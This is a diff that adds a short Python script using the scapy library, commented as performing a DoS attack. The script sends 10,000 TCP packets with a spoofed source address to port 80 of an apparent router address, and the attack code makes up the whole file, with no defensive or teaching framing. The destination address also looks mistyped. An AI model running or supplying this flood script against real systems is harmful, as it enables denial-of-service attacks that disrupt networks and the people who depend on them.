@@ -1,0 +1,8 @@
+#!/usr/bin/python
+from scapy.all import * 
+
+
+# This will perform a dos attack
+# spoof the src, dst ip router, defaut http port 80,protocal TCP, 
+
+send(IP(src="192.168.1.103", dst="192.138.1.1")/TCP(sport=80,dport=80),count=10000)
